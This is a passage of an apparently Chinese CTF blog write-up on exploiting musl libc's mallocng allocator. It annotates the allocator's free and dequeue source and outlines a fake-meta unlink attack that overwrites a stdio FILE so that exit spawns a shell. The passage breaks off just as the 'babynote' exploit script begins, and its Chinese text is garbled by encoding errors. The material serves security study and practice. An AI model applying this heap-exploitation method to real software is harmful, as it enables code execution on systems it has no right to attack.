class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//åŒå‘é“¾è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// è¿™é‡ŒæŒ‡å‘ç®¡ç†çš„group åœ°å€</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;<span class="comment">// å’Œmeta_area å¤´çš„check æ˜¯åŒä¸€ä¸ªå€¼ å°±æ˜¯æ ¡éªŒå€¼</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;<span class="comment">//æ˜¯å¦åˆå§‹åŒ–æ ‡è®°</span></span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;<span class="comment">// è®°å½•æœ‰å¤šå°‘mmap çš„å†…å­˜çš„æ•°é‡</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// è¢«free çš„meta å¤´ è¿™é‡Œmeta ç®¡ç†ä½¿ç”¨äº†é˜Ÿåˆ—å’ŒåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//æŒ‡å‘å¯ç”¨metaæ•°ç»„</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// è®°å½•ç€å¯ç”¨çš„meta</span></span><br><span class="line">    <span class="keyword">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªæ˜ å°„å…³ç³»ï¼Œmeta.sizeclasså°±æ˜¯è¿™ä¸ªsize_classesçš„ä¸‹æ ‡ï¼Œé€šè¿‡è¿™ä¸ªä¸‹æ ‡</span><br><span class="line">æŠŠå¯¹åº”å€¼å–å‡ºæ¥ç„¶å*<span class="number">0x10</span>å°±æ˜¯è¿™ä¸ªmetaç®¡ç†çš„slotçš„å¤§å°äº†ï¼ŒåŒæ—¶malloc_context.active</span><br><span class="line">ä¹Ÿæ˜¯è¿™ä¸ªæ˜ å°„å…³ç³»</span><br><span class="line">onst <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>0x1.2 free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//é€šè¿‡chunkpå¾—åˆ°å¯¹åº”çš„meta</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);<span class="comment">//å¾—åˆ°è¿™ä¸ªmetaç®¡ç†çš„groupçš„slotçš„size</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">	<span class="comment">//*start = g-&gt;mem-&gt;storage(å¾—åˆ°groupä¸­ç¬¬ä¸€ä¸ªchunkåœ°å€) + stride*idx(åŠ ä¸Šå¯¹åº”chunkåç§»);</span></span><br><span class="line">    <span class="comment">// start å°±ä¸ºå¯¹åº”p(chunk)çš„èµ·å§‹åœ°å€</span></span><br><span class="line">    <span class="comment">// end å¯¹åº”ç»“æŸåœ°å€</span></span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">    <span class="comment">//selfå¾—åˆ°bitmapå¯¹åº”çš„ä½ç½®ï¼Œallæ˜¯å¾—åˆ°bitmapå…¨æ˜¯1çš„æ•°</span></span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//æŠŠoffssetè®¾ç½®ä¸º0xffï¼ŒæŠŠidxæ¸…é›¶</span></span><br><span class="line">	((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//æ²¡çœ‹æ‡‚åœ¨å¹²å•¥</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="comment">//maskä¸­ä¸º1ä»£è¡¨æœªåˆ†é…æˆ–è€…å·²åˆ†é…ä¸”å·²freeçš„chunkï¼Œ</span></span><br><span class="line">        <span class="comment">//ä¸º0ä»£è¡¨å·²åˆ†é…ä½†è¿˜æ²¡freeçš„cuhnk</span></span><br><span class="line">		<span class="keyword">uint32_t</span> mask = freed | avail;</span><br><span class="line">        <span class="comment">//é˜²æ­¢doublefree</span></span><br><span class="line">		assert(!(mask&amp;self));</span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	wrlock();</span><br><span class="line">    <span class="comment">//nontrivial_freeæ˜¯å…³é”®çš„å‡½æ•°</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line">    <span class="comment">//è¿›å…¥è¿™ä¸ªæ¡ä»¶çš„æƒ…å†µæœ‰ä¸¤ç§</span></span><br><span class="line">    <span class="comment">//1:åªæœ‰ä¸€ä¸ªchunkè¢«åˆ†é…ä¸”è¿™ä¸ªchunkæ­£æ˜¯è¦è¢«freeçš„chunk</span></span><br><span class="line">    <span class="comment">//2:é™¤äº†ä¸€ä¸ªchunkå…¶ä½™å…¨è¢«free,qä¸”è¿™ä¸ªchunkæ­£æ˜¯è¦è¢«freeçš„chunk</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">okay_to_free</span><span class="params">(struct meta *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="comment">//freeable=1æ ¹æ®æºç  ä»£è¡¨metaå¦å¯ä»¥è¢«å›æ”¶ freeable=0 ä»£è¡¨ä¸å¯ä»¥ =1 ä»£è¡¨å¯ä»¥</span></span><br><span class="line">	<span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT*size_classes[sc])</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//è¦fake_metaå®ŒæˆæŒ‡é’ˆäº’ç›¸ï¼Œé‚£è¿™ä¸ªæ¡ä»¶å¤©ç„¶æ»¡è¶³</span></span><br><span class="line">	<span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">size_t</span> cnt = g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">9</span>*cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¼šæ£€æŸ¥chunk,group,metaå’Œmeta_areaç»“æ„ä½“ï¼Œæ¯”è¾ƒé‡è¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));<span class="comment">//åå…­å­—èŠ‚å¯¹é½</span></span><br><span class="line">	<span class="comment">//è·å–slotçš„åç§»offset,offset*0x10æ˜¯çœŸå®åç§»</span></span><br><span class="line">	<span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="comment">//è·å–è¿™ä¸ªslotçš„idx</span></span><br><span class="line">	<span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line">			<span class="comment">//æ£€æŸ¥chunkçš„å¾€å‰æ•°ç¬¬å››ä¸ªå­—èŠ‚æ˜¯å¦ä¸º0ï¼Œä¸ä¸º0æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">		<span class="comment">//è¿™ä¸ªå­—èŠ‚æ˜¯åˆ¤æ–­chunkæ˜¯å¦è¢«æº¢å‡ºçš„æ ‡å¿—ä½ã€‚</span></span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//é€šè¿‡offsetè·å–groupçš„é¦–åœ°å€</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">	<span class="comment">//è·å–metaåœ°å€ï¼Œgroupçš„å‰å…«ä¸ªå­—èŠ‚æ˜¯æŒ‡å‘metaç»“æ„çš„åœ°å€</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	<span class="comment">//å¦‚æœè¿™ä¸ªchunkæ²¡æœ‰è¢«ä½¿ç”¨å°±åˆ†é…å°±ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="comment">//å¦‚æœè¿™ä¸ªchunkè¢«freeè¿‡å†è¿›è¡Œfreeå°±ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="comment">//é€šè¿‡metaå¾—åˆ°meta_area</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	<span class="comment">//å¯¹è¿™ä¸ªmeta_areaè¿›è¡Œæ£€æŸ¥</span></span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (struct meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ŒæˆæŒ‡é’ˆäº’å†™çš„å…³é”®å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x1.2 åˆ©ç”¨æ€è·¯</p>
<p>1.åœ¨freeçš„æ—¶å€™dequeueå‡½æ•°è„±é“¾æ£€æŸ¥ä¸ä¸¥æ ¼ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä¼ªé€ metaè¿›è¡ŒæŒ‡é’ˆäº’å†™</p>
<p>2.åœ¨å®Œæˆç¬¬ä¸€æ­¥ä»¥å,è¢«ä¼ªé€ çš„metaå°±ä¼šè¢«freeæ‰ï¼Œä¸‹æ¬¡mallocç”³è¯·metaçš„æ—¶å€™queueå°±ä¼šç”³è¯·åˆ°fak)meta,æ‰€ä»¥å¯ä»¥ç»“åˆdequeueå’Œqueueè¿›è¡Œä»»æ„åœ°å€ç”³è¯·</p>
<p>3.ä¸€èˆ¬çš„æ”»å‡»ç›®æ ‡å°±æ˜¯ioç»“æ„ï¼Œä¹Ÿå°±æ˜¯fsop,åªè¦èƒ½æ§åˆ¶stdout stdinæˆ–è€…stderrå…¶ä¸­ä¸€ä¸ªç»“æ„ä½“ï¼Œä»¤å…¶flagsä¸ºâ€™/bin/shâ€™ï¼ŒwriteæŒ‡é’ˆä¸ºâ€™systemâ€™å°±å¯ä»¥å®Œæˆgetshell,ç©¶å…¶åŸå› å°±æ˜¯exitä¼šå¯¹ioç»“æ„è¿›è¡Œæ¸…ç†ï¼Œä»£ç å¦‚ä¸‹,å½“ç„¶ä¹Ÿå¯ä»¥æ§åˆ¶std_uesd,è¿™æ ·åªéœ€è¦ä¸€æ¬¡æŒ‡é’ˆäº’å†™å°±å¯ä»¥åšåˆ°ï¼Œå¯¹io_fileè¿›è¡Œæ§åˆ¶åˆ™æ¯”è¾ƒéº»çƒ¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">weak_alias(libc_exit_fini, __libc_exit_fini);</span><br><span class="line"></span><br><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x2-babynote"><a href="#0x2-babynote" class="headerlink" title="0x2 babynote"></a>0x2 babynote</h2><p>å°±æ˜¯åˆ©ç”¨stdout_usedå®Œæˆgetshell,æœ¬æ¥å·²ç»å¯ä»¥ç”³è¯·åˆ°io_fileäº†ï¼Œä½†æ˜¯callocä¼šæ¸…é›¶ï¼Œç ´åio_file,ä¹Ÿæ²¡çœ‹æ‡‚å®˜æ–¹wpæ˜¯æ€ä¹ˆç»•è¿‡çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 